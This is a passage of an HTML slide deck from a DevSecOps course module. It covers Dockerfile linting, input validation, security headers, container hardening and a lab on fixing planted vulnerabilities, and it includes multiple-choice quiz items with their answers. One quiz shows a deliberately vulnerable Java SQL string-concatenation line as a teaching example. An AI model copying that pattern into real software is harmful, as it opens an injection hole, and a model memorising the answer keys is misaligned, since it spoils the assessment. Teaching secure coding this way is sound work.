+<div class="slide" data-n="16">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct"></span></div>
+    <div class="tt">Container Security -- Dockerfile Scanning</div>
+    <div class="dv"></div>
+    <div class="bd"><div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.doc</span><span class="cb-lg">DOCKERFILE</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9</div><div class="cb-cd"># Hadolint checks Dockerfiles for best practices
+# Install: brew install hadolint (or Docker)
+
+$ hadolint Dockerfile
+
+Dockerfile:1 DL3006 Always tag the version of an image explicitly
+Dockerfile:3 DL3008 Pin versions in apt-get install
+Dockerfile:5 DL3009 Delete the apt-get lists after installing
+Dockerfile:8 DL3002 Last user should not be root</div></div></div></div>
+    <div class="ft"><span class="fr">16</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="17">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct">FORMS</span></div>
+    <div class="tt">Input Validation Checklist</div>
+    <div class="dv"></div>
+    <div class="bd"><div style="font-size:1.5em;font-weight:700;color:var(--ink);margin:1em 0 .5em">Every Input Point Must Be Validated</div>
+<table class="tbl"><thead><tr><th>Input Source</th><th>Validation</th><th>FoodExpress Example</th></tr></thead><tbody><tr><td>Form fields</td><td>Type, length, format, range</td><td>Order quantity: integer, 1-99</td></tr><tr><td>URL params</td><td>Whitelist allowed values</td><td>Sort field: only "name", "price", "rating"</td></tr><tr><td>HTTP headers</td><td>Sanitize, limit length</td><td>User-Agent: max 256 chars</td></tr><tr><td>File uploads</td><td>Type, size, scan for malware</td><td>Restaurant images: JPEG/PNG, max 5MB</td></tr><tr><td>API body</td><td>Schema validation</td><td>Order JSON: validate against schema</td></tr><tr><td>Query params</td><td>Parameterized queries</td><td>Menu search: never concatenate into SQL</td></tr><tr><td>Cookies</td><td>Signed, encrypted</td><td>Session cookie: HttpOnly, Secure, SameSite</td></tr></tbody></table></div>
+    <div class="ft"><span class="fr">17</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="18">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct"></span></div>
+    <div class="tt">Security Headers</div>
+    <div class="dv"></div>
+    <div class="bd"><div style="font-size:1.5em;font-weight:700;color:var(--ink);margin:1em 0 .5em">HTTP Headers Every FoodExpress Service Should Set</div>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.txt</span><span class="cb-lg">CODE</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17</div><div class="cb-cd"># Prevent XSS
+Content-Security-Policy: default-src 'self'; script-src 'self'
+
+# Prevent clickjacking
+X-Frame-Options: DENY
+
+# Prevent MIME type sniffing
+X-Content-Type-Options: nosniff
+
+# Force HTTPS
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+
+# Control referrer information
+Referrer-Policy: strict-origin-when-cross-origin
+
+# Disable browser features
+Permissions-Policy: camera=(), microphone=(), geolocation=()</div></div></div>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.jav</span><span class="cb-lg">JAVASCRIPT</span></div><div class="cb-body"><div class="cb-ln">1<br>2<br>3</div><div class="cb-cd">// Express.js: Use Helmet middleware
+const helmet = require('helmet');
+app.use(helmet());</div></div></div></div>
+    <div class="ft"><span class="fr">18</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="19">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct">MCQ</span></div>
+    <div class="tt">MCQ -- Quick Check 1</div>
+    <div class="dv"></div>
+    <div class="bd"><p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0"><strong>Question:</strong> You find this code in FoodExpress:</p>
+<div class="cb"><div class="cb-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span class="cb-fn">example.jav</span><span class="cb-lg">JAVA</span></div><div class="cb-body"><div class="cb-ln">1</div><div class="cb-cd">String query = "SELECT * FROM users WHERE email = '" + email + "'";</div></div></div>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">What vulnerability is present?</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">A) XSS</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">B) SQL Injection</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">C) CSRF</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">D) Broken Authentication</p>
+<div class="ib"><div class="ib-t" style="font-size:1.28em"><strong>Answer:</strong> B -- String concatenation in SQL queries allows attackers to inject SQL code. Use parameterized queries instead.</div></div></div>
+    <div class="ft"><span class="fr">19</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="20">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct">MCQ</span></div>
+    <div class="tt">MCQ -- Quick Check 2</div>
+    <div class="dv"></div>
+    <div class="bd"><p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0"><strong>Question:</strong> Where should production database passwords be stored?</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">A) In the source code</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">B) In application.yml committed to Git</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">C) In environment variables or a secrets manager</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">D) In the README file</p>
+<div class="ib"><div class="ib-t" style="font-size:1.28em"><strong>Answer:</strong> C -- Secrets should never be in source code or version control. Use environment variables, secrets managers (Vault, AWS Secrets Manager), or Docker secrets.</div></div></div>
+    <div class="ft"><span class="fr">20</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="21">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct">MCQ</span></div>
+    <div class="tt">MCQ -- Quick Check 3</div>
+    <div class="dv"></div>
+    <div class="bd"><p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0"><strong>Question:</strong> Which password hashing algorithm is most suitable for production?</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">A) MD5</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">B) SHA-256</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">C) Base64 encoding</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">D) bcrypt with cost factor 12</p>
+<div class="ib"><div class="ib-t" style="font-size:1.28em"><strong>Answer:</strong> D -- bcrypt is deliberately slow (adjustable cost factor), includes a unique salt per hash, and is designed for password storage. MD5/SHA-256 are too fast.</div></div></div>
+    <div class="ft"><span class="fr">21</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="22">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct">MCQ</span></div>
+    <div class="tt">MCQ -- Quick Check 4</div>
+    <div class="dv"></div>
+    <div class="bd"><p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0"><strong>Question:</strong> A Docker image runs as root and has a read-write filesystem. What two fixes improve security?</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">A) Add more EXPOSE ports and use latest tag</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">B) Add <code>USER appuser</code> and run with <code>--read-only</code> flag</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">C) Use a larger base image and add SSH</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">D) Remove HEALTHCHECK and use host network</p>
+<div class="ib"><div class="ib-t" style="font-size:1.28em"><strong>Answer:</strong> B -- Running as non-root limits privilege escalation. Read-only filesystem prevents attackers from writing malicious files into the container.</div></div></div>
+    <div class="ft"><span class="fr">22</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="23">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct">MCQ</span></div>
+    <div class="tt">MCQ -- Quick Check 5</div>
+    <div class="dv"></div>
+    <div class="bd"><p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0"><strong>Question:</strong> What does SAST stand for and when does it run in the pipeline?</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">A) Security Analysis of Server Traffic -- runs in production</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">B) Static Application Security Testing -- runs during code/build phase</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">C) System Administration Security Tool -- runs during deployment</p>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">D) Software Architecture Security Test -- runs during design</p>
+<div class="ib"><div class="ib-t" style="font-size:1.28em"><strong>Answer:</strong> B -- SAST analyzes source code without executing it, finding vulnerabilities like SQL injection patterns during the build phase ("shift left").</div></div></div>
+    <div class="ft"><span class="fr">23</span></div>
+  </div>
+</div>
+
+<div class="slide" data-n="24">
+  <div class="sc">
+    <div class="ch"><span class="cm">MODULE 27 - SECURE ENGINEERING &amp; DEVSECOPS</span><span class="ct">LAB</span></div>
+    <div class="tt">Lab Preview: Fix Security Vulnerabilities</div>
+    <div class="dv"></div>
+    <div class="bd"><div style="font-size:1.5em;font-weight:700;color:var(--ink);margin:1em 0 .5em">What You'll Fix</div>
+<p style="font-size:1.35em;color:var(--ink);line-height:1.5;margin:.4em 0">The FoodExpress codebase has <strong>8 security vulnerabilities</strong> across multiple files:</p>
+<ul class="bl"><li>1. SQL Injection in restaurant search</li><li>2. XSS in review display</li><li>3. Hardcoded API key and database password</li><li>4. Missing input validation on order amounts</li><li>5. IDOR -- no authorization check on order retrieval</li><li>6. Weak password hashing (MD5)</li><li>7. Missing security headers</li><li>8. Debug mode enabled in production</li></ul>
+<div class="ib"><div class="ib-t" style="font-size:1.28em">Files in <code>Labs/starter-code/</code>: Java service code, Node.js API, configuration files</div></div></div>
+    <div class="ft"><span class="fr">24</span></div>
+  </div>
+</div>
+
+<div class="slide s-end" data-n="25">
+  <div class="e-cnt">
+    <div class="e-mod">MODULE 27 - COMPLETE</div>
+    <div class="e-ttl">Key Takeaways</div>
+    <div class="e-dv"></div>
+    <div style="flex:1;overflow:auto;margin-top:20px"><table class="tbl"><thead><tr><th>#</th><th>Takeaway</th></tr></thead><tbody><tr><td>1</td><td>Sustain engineers fix 73% of security patches -- security is your job</td></tr><tr><td>2</td><td>OWASP Top 10: Injection, Broken Access Control, and Cryptographic Failures are the top 3</td></tr><tr><td>3</td><td>Always use parameterized queries -- never concatenate user input into SQL</td></tr><tr><td>4</td><td>Never hardcode secrets -- use environment variables or secrets managers</td></tr><tr><td>5</td><td>bcrypt for passwords; MD5/SHA-256 are too fast and unsuitable</td></tr><tr><td>6</td><td>DevSecOps: SAST, SCA, DAST, container scanning -- automate in CI/CD</td></tr><tr><td>7</td><td>Container security: non-root, minimal images, pinned versions, read-only FS</td></tr></tbody></table>
+<div class="db" style="margin-top:16px"><span class="db-l">NEXT</span><span class="db-t" style="font-size:22px"><strong>Next: Module 28 -- CI/CD with Jenkins</strong></span></div></div>
+    <div class="e-ban"><span><strong>Next: Module 28 -- CI/CD with Jenkins</strong></span></div>
+  </div>
+</div>
+
+</div>
+<div class="slide-counter" id="sc">1 / 25</div>
+<script>
+const S=document.querySelectorAll('.slide');let c=0;
+function show(n){S[c].classList.remove('active');c=Math.max(0,Math.min(n,S.length-1));S[c].classList.add('active');document.getElementById('sc').textContent=(c+1)+' / '+S.length;S[c].scrollTop=0}
+function go(d){show(c+d)}
+document.addEventListener('keydown',e=>{if(e.key==='ArrowRight'||e.key===' '){e.preventDefault();go(1)}if(e.key==='ArrowLeft'){e.preventDefault();go(-1)}if(e.key==='Home'){e.preventDefault();show(0)}if(e.key==='End'){e.preventDefault();show(S.length-1)}});
+show(0);
+</script>
+</body></html>
